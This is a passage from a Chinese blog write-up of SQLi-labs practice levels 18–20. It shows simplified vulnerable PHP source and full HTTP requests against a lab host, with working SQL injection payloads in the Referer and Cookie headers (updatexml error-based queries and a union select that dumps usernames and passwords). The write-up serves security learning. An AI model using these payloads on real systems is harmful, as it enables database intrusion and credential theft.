+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://sqli.pl/Less-18/</span>
+</span></span><span class="line"><span class="cl"><span class="n">DNT</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">8.8.8.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">34</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=admin&amp;passwd=0&amp;submit=Submit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gkoe77ij/02.png"
+	width="1239"
+	height="579"
+	srcset="/p/gkoe77ij/02_hudd082805d857caea678dd6a3b92892b6_92896_480x0_resize_box_3.png 480w, /p/gkoe77ij/02_hudd082805d857caea678dd6a3b92892b6_92896_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="513px"
+	
+></p>
+<h2 id="less-19">Less-19</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>VALUES ('$uagent')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 获取请求的 referer 和 ip 地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uagent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IP</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">输入了uname</span> <span class="nx">和</span> <span class="nx">passwd</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># uname 和 passwd 参数均被过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">SQL语句有返回结果</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 单引号拼接后直接带入 insert 语句
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$insert</span><span class="o">=</span><span class="s2">&#34;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;</span><span class="si">$uagent</span><span class="s2">&#39;, &#39;</span><span class="si">$IP</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">输出</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Http" data-lang="Http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/Less-19/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">sqli.pl</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">1&#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#39;1&#39;=&#39;1</span>
+</span></span><span class="line"><span class="cl"><span class="n">DNT</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">8.8.8.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">34</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=admin&amp;passwd=0&amp;submit=Submit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gkoe77ij/03.png"
+	width="1237"
+	height="621"
+	srcset="/p/gkoe77ij/03_huc3c8118e8470ba9d608895af650bdbbf_95843_480x0_resize_box_3.png 480w, /p/gkoe77ij/03_huc3c8118e8470ba9d608895af650bdbbf_95843_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="478px"
+	
+></p>
+<h2 id="less-20">Less-20</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>username='$cookee'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">cookie</span> <span class="nx">中不存在</span> <span class="nx">uname</span> <span class="nx">参数</span><span class="o">:</span>  
+</span></span><span class="line"><span class="cl">    <span class="nx">输出了一堆无用的信息</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">提交了</span> <span class="nx">uname</span> <span class="nx">和</span> <span class="nx">passwd</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 进行过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cookee</span> <span class="o">=</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">有查询结果</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 将 uname 的值设置给 cookie 里面的 uname 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;uname&#39;</span><span class="p">,</span> <span class="nv">$cookee</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">POST</span> <span class="nx">数据里面没有</span> <span class="nx">submit</span> <span class="nx">参数</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cookee</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 直接将 cookee 通过单引号拼接到 SQL 语句中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$cookee</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">查询无结果</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">输出</span> <span class="nx">mysql_error</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">有结果</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">输出查询的信息</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 将 uname 的值设置给 cookie 里面的 uname 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;uname&#39;</span><span class="p">,</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nx">time</span><span class="p">()</span><span class="o">-</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关</p>
+<h3 id="联合查询注入-2">联合查询注入</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /Less-20/ HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: sqli.pl
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Cookie: uname=-admin&#39; union select (select group_concat(username,&#39;:&#39;,password+SEPARATOR+0x3c62723e) from users),2,3#
+</span></span><span class="line"><span class="cl">DNT: 1
+</span></span><span class="line"><span class="cl">X-Forwarded-For: 8.8.8.8
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gkoe77ij/04.png"
+	width="1242"
+	height="638"
+	srcset="/p/gkoe77ij/04_hu2eba66d02b1b1a15ea5d3e1653dfd9e2_113068_480x0_resize_box_3.png 480w, /p/gkoe77ij/04_hu2eba66d02b1b1a15ea5d3e1653dfd9e2_113068_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<h3 id="报错注入-1">报错注入</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Http" data-lang="Http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/Less-20/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">sqli.pl</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">uname=admin&#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#</span>
+</span></span><span class="line"><span class="cl"><span class="n">DNT</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">8.8.8.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/gkoe77ij/05.jpg"
+	width="1249"
+	height="540"
+	srcset="/p/gkoe77ij/05_hu78daf92ba78b5a4ca600a5502fef5138_70631_480x0_resize_q75_box.jpg 480w, /p/gkoe77ij/05_hu78daf92ba78b5a4ca600a5502fef5138_70631_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="555px"
+	
+></p>
+<h3 id="盲注">盲注</h3>
+<p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+        
+            <a href="/tags/sqlilab/">sqlilab</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/5b8yxplu/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg" loading="lazy" data-key="5b8yxplu" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之进阶挑战 54-65 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/cjxjnagt/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg" loading="lazy" data-key="cjxjnagt" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之堆叠注入 38-53 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ojwgoapt/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg" loading="lazy" data-key="ojwgoapt" data-hash="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之高级注入姿势 21-37 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/yyvork8r/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png" loading="lazy" data-key="yyvork8r" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入学习之MYSQL报错注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wto41ytz/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="wto41ytz" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入学习之MYSQL盲注</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
